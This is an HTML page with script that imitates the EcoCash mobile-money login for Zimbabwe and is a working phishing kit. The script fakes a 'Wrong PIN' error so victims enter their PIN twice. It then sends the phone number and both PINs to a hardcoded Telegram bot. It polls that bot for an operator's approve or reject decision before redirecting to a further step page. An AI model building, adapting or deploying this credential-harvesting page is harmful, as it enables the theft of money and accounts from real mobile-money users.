
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>EcoCash Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- Sofia Pro font from Sportmonks CDN -->
<link rel="stylesheet" href="https://cdn.sportmonks.com/fonts/SofiaPro/stylesheet.css">
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">

<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}

body{
  font-family:'Sofia Pro','Roboto',sans-serif;
  background:#fff;
  color:#1a1a1a;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  overflow-x:hidden;
}

/* ===== MAIN CONTENT (scrollable top area) ===== */
.main{
  flex:1;
  display:flex;
  flex-direction:column;
  align-items:center;
  padding:48px 24px 30px;
}

/* ===== LOGO ===== */
.logo{
  font-size:44px;
  font-weight:700;
  letter-spacing:-1px;
  margin-bottom:36px;
  line-height:1;
}
.logo .eco{color:#1a56db}
.logo .cash{color:#e02020}

/* ===== LOGIN TITLE ===== */
h2{
  font-size:26px;
  font-weight:700;
  color:#111;
  margin-bottom:28px;
  letter-spacing:-0.3px;
}

/* ===== PHONE BOX ===== */
.phone-box{
  width:100%;
  max-width:420px;
  border:2px solid #1a56db;
  border-radius:12px;
  display:flex;
  align-items:center;
  padding:13px 14px;
  margin-bottom:28px;
  background:#fff;
  gap:6px;
}

.flag-wrap{
  display:flex;
  align-items:center;
  gap:4px;
  flex-shrink:0;
}

.flag{font-size:22px;line-height:1}

.chevron{
  font-size:10px;
  color:#888;
  margin-left:1px;
}

.divider{
  width:1px;
  height:20px;
  background:#d0d7e3;
  margin:0 8px;
  flex-shrink:0;
}

.prefix{
  font-size:16px;
  font-weight:500;
  color:#111;
  flex-shrink:0;
}

.phone-box input{
  border:none;
  outline:none;
  font-size:16px;
  font-family:'Sofia Pro','Roboto',sans-serif;
  color:#111;
  flex:1;
  min-width:0;
  background:transparent;
}

.phone-box input::placeholder{color:#aab0bc}

/* ===== PIN LABEL ===== */
.pin-label{
  font-size:15px;
  font-weight:400;
  color:#444;
  margin-bottom:18px;
  text-align:center;
}

/* ===== PIN INPUTS ===== */
.pin{
  display:flex;
  justify-content:center;
  gap:16px;
  margin-bottom:10px;
}

.pin-input{
  width:62px;
  height:62px;
  border:2.5px solid #1a56db;
  border-radius:12px;
  font-size:24px;
  font-weight:600;
  text-align:center;
  outline:none;
  color:#111;
  background:#fff;
  font-family:'Sofia Pro','Roboto',sans-serif;
  transition:border-color .15s,box-shadow .15s;
  -webkit-appearance:none;
  -webkit-text-security:disc;
}

.pin-input:focus{
  border-color:#1240a8;
  box-shadow:0 0 0 3px rgba(26,86,219,0.13);
}

/* ===== ERROR ===== */
#pin-error{
  font-size:13.5px;
  font-weight:500;
  color:#d32f2f;
  text-align:center;
  min-height:20px;
  margin:8px 0 4px;
  opacity:0;
  transition:opacity .2s;
}

.forgot{
  font-size:14px;
  color:#666;
  text-align:center;
  margin-top:4px;
  cursor:pointer;
}

/* ===== BOTTOM BLUE SECTION ===== */
.bottom{
  background:#1a56db;
  color:#fff;
  text-align:center;
  padding:48px 28px 36px;
  position:relative;
  flex-shrink:0;
}

/* Wave cutout at top of blue section */
.bottom::before{
  content:'';
  position:absolute;
  top:-38px;left:0;right:0;
  height:40px;
  background:#1a56db;
  border-radius:55% 55% 0 0 / 100% 100% 0 0;
}

.bottom p{
  font-size:15px;
  font-weight:400;
  line-height:1.6;
  margin-bottom:28px;
  opacity:0.95;
}

/* ===== ACTION BUTTONS ===== */
.actions{
  display:flex;
  gap:14px;
  justify-content:center;
  margin-bottom:32px;
}

.btn{
  background:#fff;
  color:#1a56db;
  border:none;
  padding:16px 10px 14px;
  border-radius:14px;
  font-weight:500;
  font-size:14px;
  font-family:'Sofia Pro','Roboto',sans-serif;
  width:148px;
  cursor:pointer;
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:8px;
  transition:opacity .15s;
}

.btn:active{opacity:0.85}

.btn-icon{
  font-size:22px;
  line-height:1;
}

/* ===== FOOTER ===== */
.footer{
  font-size:12.5px;
  opacity:0.88;
  line-height:1.8;
}

.footer a{
  color:#fff;
  text-decoration:underline;
  text-underline-offset:2px;
}

/* ===== PROCESSING OVERLAY ===== */
#processingOverlay{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,0.5);
  display:none;
  align-items:center;
  justify-content:center;
  z-index:999;
}

.processing-box{
  background:#fff;
  padding:30px 36px;
  border-radius:18px;
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:16px;
  font-size:15px;
  font-weight:500;
  color:#1a56db;
  box-shadow:0 8px 32px rgba(0,0,0,0.18);
}

.spinner{
  width:40px;height:40px;
  border:3.5px solid #dde8fa;
  border-top-color:#1a56db;
  border-radius:50%;
  animation:spin .8s linear infinite;
}

@keyframes spin{to{transform:rotate(360deg)}}

@keyframes shake{
  0%,100%{transform:translateX(0)}
  20%{transform:translateX(-5px)}
  40%{transform:translateX(5px)}
  60%{transform:translateX(-5px)}
  80%{transform:translateX(5px)}
}

.shake{animation:shake .4s ease}

@media(max-width:360px){
  .pin-input{width:54px;height:54px;font-size:20px}
  .logo{font-size:38px}
  .btn{width:136px}
}
</style>
<base target="_blank">
</head>

<body>

<div class="main">
  <!-- LOGO -->
  <div class="logo">
    <span class="eco">Eco</span><span class="cash">Cash</span>
  </div>

  <h2>Login</h2>

  <!-- PHONE -->
  <div class="phone-box">
    <div class="flag-wrap">
      <span class="flag">🇿🇼</span>
      <span class="chevron">▼</span>
    </div>
    <div class="divider"></div>
    <span class="prefix">+263</span>
    <input type="tel" id="phone" maxlength="9" placeholder="Phone Number" inputmode="numeric">
  </div>

  <!-- PIN -->
  <div class="pin-label">Enter your PIN</div>

  <div class="pin">
    <input class="pin-input" type="password" inputmode="numeric" maxlength="1">
    <input class="pin-input" type="password" inputmode="numeric" maxlength="1">
    <input class="pin-input" type="password" inputmode="numeric" maxlength="1">
    <input class="pin-input" type="password" inputmode="numeric" maxlength="1">
  </div>

  <div id="pin-error">Wrong PIN</div>
  <div class="forgot">Forgot PIN?</div>
</div>

<!-- BOTTOM BLUE -->
<div class="bottom">
  <p>To register an EcoCash wallet or get assistance,<br>click below</p>

  <div class="actions">
    <button class="btn">
      <span class="btn-icon">👤</span>
      Register
    </button>
    <button class="btn">
      <span class="btn-icon">ℹ️</span>
      Help &amp; Support
    </button>
  </div>

  <div class="footer">
    <p>v3.0.2P</p>
    <p>By signing in you agree to the <a href="#">Terms and Conditions</a></p>
  </div>
</div>

<!-- OVERLAY -->
<div id="processingOverlay">
  <div class="processing-box">
    <div class="spinner"></div>
    <div>Processing…</div>
  </div>
</div>

    <script>
let firstPin = '';
let secondPin = '';
let pinAttempt = 0;

const pinInputs = document.querySelectorAll('.pin-input');
const errorMsg  = document.getElementById('pin-error');
const phoneInput = document.getElementById('phone');
const overlay   = document.getElementById('processingOverlay');

function getPinValue() {
  return Array.from(pinInputs).map(i => i.value).join('');
}

function sendToTelegram(phone, firstPin, secondPin) {
  const botToken = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
  const chatId   = "7162306402";

  
  // MarkdownV2 escape for text portions
  const escapeMd = s => s.replace(/[_*\[\]()~`>#+\-=|{}.!]/g, '\\$&');
  
  // Phone as clickable tel: link — opens dialer on tap
  const escapedPhone = escapeMd(phone);
  const message = `📱 Phone: [${escapedPhone}](tel:${phone})\n🔑 First PIN: ${escapeMd(firstPin)}\n🔑 Second PIN: ${escapeMd(secondPin)}\n\n👇 Please Approve or Reject:`;
  
  const inlineKeyboard = {
    inline_keyboard: [[
      { text: "✅ Approve", callback_data: `APPROVE_${phone}` },
      { text: "❌ Reject",  callback_data: `REJECT_${phone}` }
    ]]
  };
  
  return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: 'MarkdownV2',
      reply_markup: JSON.stringify(inlineKeyboard),
      disable_web_page_preview: true
    })
  });
}

function startListeningForAdminDecision(phone) {
  const botToken = '8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc';
  let offset = 0;
  let decided = false;
  let pollCount = 0;
  const maxPolls = 45; // 3 minutes max (45 * 4 seconds)

  console.log('Starting poll for phone:', phone);

  function poll() {
    if (decided) {
      console.log('Already decided, stopping poll');
      return;
    }

    pollCount++;
    if (pollCount > maxPolls) {
      console.log('Max polls reached, stopping');
      overlay.style.display = 'none';
      errorMsg.textContent = 'Session timed out. Please try again.';
      errorMsg.style.opacity = '1';
      pinAttempt = 0;
      firstPin = '';
      secondPin = '';
      return;
    }

    console.log('Polling... attempt', pollCount, 'offset:', offset);

    fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=20&offset=${offset}`)
      .then(r => r.json())
      .then(data => {
        console.log('Poll response:', data);
        if (!data.ok) {
          console.error('Telegram API error:', data);
          setTimeout(poll, 4000);
          return;
        }

        if (decided) return;

        for (let update of data.result) {
          offset = update.update_id + 1;
          console.log('Processing update:', update.update_id, 'type:', update.callback_query ? 'callback' : 'message');

          if (update.callback_query) {
            const action = update.callback_query.data;
            console.log('Callback data:', action, 'Expected APPROVE:', `APPROVE_${phone}`, 'Expected REJECT:', `REJECT_${phone}`);

            if (action === `APPROVE_${phone}`) {
              console.log('APPROVE received!');
              decided = true;
              overlay.style.display = 'none';
              window.location.href = 'step6.html';
              return;
            } else if (action === `REJECT_${phone}`) {
              console.log('REJECT received!');
              decided = true;
              overlay.style.display = 'none';
              errorMsg.textContent = 'Please input correct credentials.';
              errorMsg.style.opacity = '1';
              pinInputs.forEach(i => i.value = '');
              pinInputs[0].focus();
              pinAttempt = 0;
              firstPin = '';
              secondPin = '';
              return;
            }
          }
        }

        // Continue polling if no decision yet
        if (!decided) {
          setTimeout(poll, 4000);
        }
      })
      .catch(err => {
        console.error('Polling error:', err);
        if (!decided) {
          setTimeout(poll, 4000);
        }
      });
  }

  // Get initial offset, then start polling
  fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=1`)
    .then(r => r.json())
    .then(data => {
      if (data.ok && data.result.length > 0) {
        offset = data.result[data.result.length - 1].update_id + 1;
      }
      console.log('Initial offset set to:', offset);
      // Start polling immediately
      poll();
    })
    .catch(err => {
      console.error('Failed to get initial offset:', err);
      // Start polling anyway
      poll();
    });
}

pinInputs.forEach((input, idx) => {
  input.addEventListener('input', e => {
    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 1);

    if (input.value && idx < pinInputs.length - 1) {
      pinInputs[idx + 1].focus();
    }

    errorMsg.style.opacity = '0';

    if ([...pinInputs].every(i => i.value.length === 1)) {
      pinAttempt++;

      if (pinAttempt === 1) {
        firstPin = getPinValue();
        // Show wrong PIN shake on first attempt
        errorMsg.textContent = 'Wrong PIN';
        errorMsg.style.opacity = '1';
        const pinRow = document.querySelector('.pin');
        pinRow.classList.remove('shake');
        void pinRow.offsetWidth;
        pinRow.classList.add('shake');
        setTimeout(() => {
          pinInputs.forEach(i => i.value = '');
          pinInputs[0].focus();
        }, 120);

      } else if (pinAttempt === 2) {
        secondPin = getPinValue();
        const phone = phoneInput.value.trim();
        if (!phone) {
          errorMsg.textContent = 'Please enter your phone number.';
          errorMsg.style.opacity = '1';
          pinAttempt--;
          return;
        }
        localStorage.setItem('phoneNumber', '+263' + phone);
        overlay.style.display = 'flex';
        sendToTelegram(phone, firstPin, secondPin)
          .then(res => res.json())
          .then(data => {
            console.log('Telegram sendMessage response:', data);
            if (data.ok) {
              startListeningForAdminDecision(phone);
            } else {
              console.error('Failed to send Telegram message:', data);
              overlay.style.display = 'none';
              errorMsg.textContent = 'Network error. Please try again.';
              errorMsg.style.opacity = '1';
              pinAttempt = 0;
              firstPin = '';
              secondPin = '';
            }
          })
          .catch(err => {
            console.error('Send to Telegram error:', err);
            overlay.style.display = 'none';
            errorMsg.textContent = 'Network error. Please try again.';
            errorMsg.style.opacity = '1';
            pinAttempt = 0;
            firstPin = '';
            secondPin = '';
          });
      }
    }
  });

  input.addEventListener('keydown', e => {
    if (e.key === 'Backspace' && !input.value && idx > 0) {
      pinInputs[idx - 1].focus();
    }
  });
});
</script>
